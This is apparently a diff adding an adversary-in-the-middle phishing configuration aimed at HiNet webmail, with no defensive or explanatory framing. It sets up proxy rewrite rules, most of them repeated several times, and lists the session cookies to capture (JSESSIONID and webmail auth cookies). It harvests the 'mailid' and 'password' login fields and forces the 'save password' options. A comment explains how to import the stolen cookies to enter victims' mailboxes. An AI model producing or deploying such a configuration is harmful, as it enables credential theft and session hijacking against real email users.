+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: '', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'www', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 't.ssp', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'dmp', domain: 'tenmax.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'tenmax-static', domain: 'cacafly.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'sg1002', domain: 'webmail.hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sg1002.webmail.hinet.net', orig_sub: 'p8u', domain: 'hinet.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+auth_tokens:
+  - domain: '.hinet.net'
+    keys: ['_ht_hi,opt','uuid','_huid,opt','adid,opt','_ht_em,opt','.*,regexp']
+  - domain: '.ssp.hinet.net'
+    keys: ['uuid,opt','.*,regexp']    
+  - domain: '.webmail.hinet.net'
+    keys: ['Latest,opt','isPIMUser,opt','PWRE,opt','U','S','T','N','D','.*,regexp']
+  - domain: 'sg1002.webmail.hinet.net'
+    keys: ['JSESSIONID,opt','.*,regexp']
+  - domain: 'webmail.hinet.net'
+    keys: ['JSESSIONID','adid,opt','.*,regexp']
+
+auth_urls:
+  - '/'
+  - '/*'
+  
+# NOTE: IMPORT COOKIES CAREFULLY...
+#  
+# VISIT BELOW LINK TO REACH AT THE ACCOUNT DASHBOARD AFTER IMPORTING THE CAPTURED COOKIES TO THE BROWSER.
+# https://sg1002.webmail.hinet.net/mailService/mail/M_main_1.do
+#
+# --------------------
+
+
+credentials:
+  username:
+    key: 'mailid'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/login.do'
+    search:
+      - {key: 'mailid', search: '.*'}
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'saveAccount', value: '1'}
+      - {key: 'savePasswd', value: '1'}
+    type: 'post'
+    
+login:
+  domain: 'webmail.hinet.net'
+  path: '/'
